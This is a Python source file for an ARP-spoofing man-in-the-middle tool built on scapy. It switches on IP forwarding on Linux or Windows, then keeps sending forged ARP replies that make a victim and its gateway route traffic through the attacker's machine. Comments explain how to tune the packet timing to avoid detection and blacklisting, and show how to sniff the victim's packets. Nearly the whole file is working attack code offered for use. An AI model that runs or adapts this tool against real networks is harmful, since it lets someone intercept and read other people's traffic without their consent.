from scapy.all import ARP, send, sniff
import ui, platform, subprocess
from time import sleep


windows_execute_ip_forward_check = "Get-NetIPInterface | select InterfaceAlias,AddressFamily,Forwarding | findstr Wi-Fi" #gets ipv4 and/or ipv6 forwarding status
windows_execute_ip_forward_switch = "Set-NetIPInterface -InterfaceAlias Wi-Fi -Forwarding Enabled" #enables ipv4 and/or ipv6 forwarding

def IPForward_switch():
    if platform.system() == "Linux":
        if "0" in open("/proc/sys/net/ipv4/ip_forward", 'r').read():
            ui.uprint("Enabling ip forwarding for linux")
            f = open("/proc/sys/net/ipv4/ip_forward", "r+")
            f.truncate(0)
            f.write("1")
            f.close()
        else:
            ui.uprint("Disabling ip forwarding",char="-")
            f = open("/proc/sys/net/ipv4/ip_forward", "r+")
            f.truncate(0)
            f.write("0")
            f.close()
    elif platform.system() == "Windows":
        if "Enabled" in subprocess.Popen(["powershell", windows_execute_ip_forward_check], stdout=subprocess.PIPE, shell=True).communicate()[0].decode("utf-8"):
            ui.uprint("Disabling ip forwarding for windows")
            subprocess.Popen(["powershell", windows_execute_ip_forward_switch.replace("Enabled", "Disabled")], stdout=subprocess.PIPE, shell=True)
        else:
            ui.uprint("Enabling ip forwarding for windows")
            subprocess.Popen(["powershell", windows_execute_ip_forward_switch], stdout=subprocess.PIPE, shell=True)
    elif platform.system() == "Darwin":
        ui.uprint("OSX solutions comming soon",char="!")


def IPForward_status():
    """
    just for linux and windows atm
    """
    if platform.system() == "Linux":
        if "0" in open("/proc/sys/net/ipv4/ip_forward", 'r').read():
            return True #is off
        return False #is on
    elif platform.system() == "Windows":
        if "Enabled" in subprocess.Popen(["powershell", windows_execute_ip_forward_check], stdout=subprocess.PIPE, shell=True).communicate()[0].decode("utf-8"):
            return False
        return True
    return None #something came wrong

class mitm:
    """
    This class is made to perform mitm attacks using scapy
    """

    def __init__(self):
        self.victim_ip = self.victim_mac = self.gateway_ip = self.gateway_mac = None
        self.dump = []

    def start(self):
        if self.victim_ip == None or self.victim_mac == None or self.gateway_ip == None or self.gateway_mac == None:
            ui.uprint("No target selected",char="!")
            return
        if IPForward_status():
            IPForward_switch()
        ui.uprint("Starting MITM attack")
        try:
            while True:
                send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst=self.victim_mac), verbose=False) #send to victim
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst=self.gateway_mac), verbose=False) #send to gateway
                # pkts = sniff(prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%}"), filter=f"ip host {self.victim_ip} and not arp")
                # uncommenting the above line will make the program sniff the packets and print them to the screen.
                # it could be useful for debugging purposes or to program a little bit of extra functionality such as an ip or a dns detector
                # but I highly recommend using wireshark for the packet shelling since it's way more conveinient and it's a lot more powerful / complete
                sleep(0.5)
                # the packet sent to your victim will make it think that you are a gateway and will consider you as it's nexthop (nearest router)
                #
                # reducing the timing between each sent packet would actually flood both the gateway and the victim
                # some gateway detects these packets and block the sender (you) from comunicating, you would get blacklisted
                # from the gateway on some cases (business networks for example)
                #
                # increasing the delay would actually be easier for your machine to handle with some side programs running but you might
                # loose some packets from the victim to the gateway because the actual gateway could send some packets like you and tell the
                # victim that it's in fact the nearest gateway :(
                # wierd explaination but I will make it clearer on a nice readme.md file once the project if fully done
        except KeyboardInterrupt:
            ui.uprint("Stopping MITM attack")
            IPForward_switch()
            sleep(1)
            ui.clear()

if __name__ == "__main__":
    """
    If anything goes wrong and you need to check your ip forwarding status just run this file.
    """
    print("Current ip forwarding status: ", ("off" if IPForward_status() else "on"))
